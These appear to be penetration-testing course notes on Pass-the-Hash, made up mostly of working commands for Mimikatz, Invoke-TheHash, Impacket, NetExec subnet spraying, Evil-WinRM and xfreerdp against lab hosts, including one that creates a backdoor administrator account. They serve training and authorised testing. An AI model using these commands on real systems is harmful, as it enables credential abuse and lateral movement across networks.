---
title: Pass the Hash (PtH)
tags: [password-attacks, pass-the-hash, mimikatz, impacket, netexec, evil-winrm, xfreerdp, ntlm, lateral-movement]
---

# Pass the Hash (PtH)

> PtH uses an NTLM hash directly for authentication — no plaintext password needed. Works because NTLM authentication uses the hash itself in the challenge-response exchange.

## How to Obtain Hashes

- Dump local SAM database (`secretsdump`, `netexec --sam`)
- Extract from NTDS.dit (domain controller)
- Pull from LSASS memory (`mimikatz`, `pypykatz`)

!!! info
    PtH only works with **NTLM** hashes — not Kerberos tickets. For Kerberos, use Pass the Ticket instead.

---

## PtH on Windows

### Mimikatz — sekurlsa::pth

Opens a new process (`cmd.exe` by default) running in the context of the target user.

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe
```

Parameters:
- `/user` — username to impersonate
- `/rc4` or `/NTLM` — the hash
- `/domain` — domain name (use `.` for local accounts)
- `/run` — process to launch (default: `cmd.exe`)

### Invoke-TheHash (PowerShell)

```powershell
Import-Module .\Invoke-TheHash.psd1

# SMB execution
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb \
  -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B \
  -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

# WMI execution
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb \
  -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B \
  -Command "whoami"
```

---

## PtH from Linux

### Impacket — psexec

```bash
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

Other Impacket tools that support PtH:

```bash
impacket-wmiexec administrator@<IP> -hashes :<hash>
impacket-atexec administrator@<IP> -hashes :<hash>
impacket-smbexec administrator@<IP> -hashes :<hash>
```

### NetExec

```bash
# Spray a hash across a subnet
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

# Local admin spray (use --local-auth)
netexec smb 172.16.1.0/24 -u Administrator --local-auth -H 30B3783CE2ABF1AF70F77D0660CF3453

# Execute a command with the hash
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

### Evil-WinRM

```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

### RDP via xfreerdp

Requires **Restricted Admin Mode** on the target.

```powershell
# Enable Restricted Admin Mode on target (if you already have shell access)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

---

## UAC and PtH — Important Caveats

UAC restricts local accounts from performing remote administration by default.

- Registry key: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
  - `0` (default) — only the built-in RID-500 Administrator can do remote PtH
  - `1` — all local admin accounts can do remote PtH

- If `FilterAdministratorToken` is enabled (value `1`), even the RID-500 account is blocked.

!!! tip
    **Domain accounts with local admin rights bypass UAC restrictions** — PtH works for domain admins on remote machines regardless of `LocalAccountTokenFilterPolicy`.
